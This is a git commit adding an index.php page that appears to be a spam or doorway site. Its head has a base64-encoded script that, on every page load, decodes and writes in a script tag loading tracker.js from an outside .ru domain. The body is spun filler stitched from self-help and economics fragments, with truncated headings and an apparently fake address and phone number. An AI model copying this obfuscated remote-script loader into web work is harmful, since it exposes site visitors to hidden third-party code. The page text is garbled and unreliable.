4c22c8dbe00c1cecb3bb7bcec506dcc5248f061c
lizaefou <79940169+lizaefou@users.noreply.github.com>
2021-03-02 22:15:40 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl90dDcyNnY5MDY4eGYxZDNhenIiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>There is a huge variety of interpretations of justice and ways to achieve it, b</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="l42q1x2aqamt6i4bv">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="zdp0al9urgienx2t7i">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>There is a huge variety of interpretations of justice and ways to achieve it, b</h1>
+	</section>
+
+
+	<section class="our-work" class="ccdfvedqo8hqswqtnseo">
+		<h3 class="title">If I don't learn the correct principles of human in</h3>
+		<p>partial reproduction of the object in nature is carried out.  But please don't tell your mom, okay? - You do not wantso that mom knows about it.  You can consciously do it yourself.  But the real achievement was how the father-son relationship changed.  1 this conditionally corresponds to the volumes of output A, B, C.  And if the criteria are defined correctly, then he can cope with this task.  And its whole point is to shift responsibility.  PRICE POLICY OF MONOPOLISTIC FORMATIONS In the price the benefit of the monopoly position is realized.  The formulation of goals should be done with the utmost certainty.  Cyclical unemployment is the difference between the actual value of the unemployment rate and the value of the natural rate.  I mean, say, such a principle as justice, from which all our ideas about equality and justice come from.  Can you imagine how I felt at this moment? My paradigm has shifted. </p>
+		<hr>
+
+		<ul class="grid" class="k8gk31763hhoeb63">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="l42q1x2aqamt6i4bv">
+		<h3 class="title">Sandra was ready for anything other than s</h3>
+		<p>Labor force migration is an urgent problem in connection with unemployment, which comes in two forms: internal and external.  Traditional authoritarian leadership is a consequence of the Win / Lose paradigm.  34 of the Constitution of the Russian Federation.After all, the functioning of a natural monopoly is aimed not at monopolization, but at the elimination of unfair competition.  The training system, planning system, communication system, financial system, information system, salary system - all of them should be based on the "Win / Win" principle. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zdp0al9urgienx2t7i" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ccdfvedqo8hqswqtnseo">
+		<h3 class="title">3) fixed costs.  The state, represented by its bodies, develops</h3>
+		<p>You know, I have one serious problem.  - I need to cut! Habit 7 requires setting aside time to sharpen the saw.  “Honestly, I didn't know you were trying to help your brother.  You always remember your every role.  This is the trust that you instill in your Emotional Bank Account. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="k8gk31763hhoeb63" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="l42q1x2aqamt6i4bv">
+		<h3 class="title">The four factors to upgrade Habit 7 are your person</h3>
+		<p>My duplicity will breed mistrust, and no matter what I do, even if I use the so-called method of good human relations,- everything will be perceived as manipulation.  I understood him.  - And we have three children; we are concerned about their fate.  Foreign capital can contribute to the development of domestic investment.  5. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zdp0al9urgienx2t7i" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ccdfvedqo8hqswqtnseo">
+		<h3 class="title">Independence is our most important achieve</h3>
+		<p>Sandra and I did not have to emotionally strain, try to check every step of our daughter and immediately punish her if she did something not the way we expected of her.  The Win / Win attitude is the belief in the existence of the Third Alternative.  The concept of perfect competition focused attention on the equilibrium state of an enterprise, an industry as a result that preceded competition.  This person turned my life into a nightmare, and often I vent my anger on my family.  Why aren't children doing their job easily and without being reminded? I am a very busy person.  - Wonderful! Do you do what you want to doall that remains for me is to act by elimination.  How to Use This Book Before we start working on the Seven Habits of Highly Effective People, I would like to offer you two paradigm shifts that will greatly enhance the value of the information you gain from reading this book.  Pick a particularly depressing problem in your personal or professional life.  However, entertainment by itself does not bring deep, lasting satisfaction and a sense of fullness of life.  We call such a choice an error, and this is the second circumstance that deserves our serious attention. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="k8gk31763hhoeb63" class="title">About half of small businesses in our country are engaged in tr</h3>	
+		<p>"Human" dimension.  If you value the existing relationship and the gain is not too important for you, then under certain circumstances, in order to support the person, you can adopt the “Lose / Win” model.  Our most important financial resource is our own ability to make money.If we do not continually invest in improving our own PCs, we are severely limiting our options.  Your inner security lies somewhere in the interval between extreme insecurity, on the one hand (when your life is under constant blows from external forces that twirl it as they want),and highly developed self-esteem and self-confidence - on the other.  The product is promoted as a means of satisfying one or a number of specific needs; 3) requests.  Many workers do not fall into the employed category.  The price of labor power, the monetary expression of which is wages, must ensure expanded reproduction and qualitative development of labor power.The most important functions of wages in a market economy include stimulating an employee to work highly productive, ensuring social justice, taking into account the measure of living labor in the process of forming the price of a product.  Through this system, managers communicate their orders to each executor and monitor their implementation. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="l42q1x2aqamt6i4bv">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="zdp0al9urgienx2t7i"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ccdfvedqo8hqswqtnseo"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="k8gk31763hhoeb63"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>77461 Towne Place, Suite 694, 92792-5729, Efrenborough, Pennsylvania, United States</p>
+		<p>Phone number: +8(75)559-71011</p>
+	</footer>
+
+</body>
+
+</html>
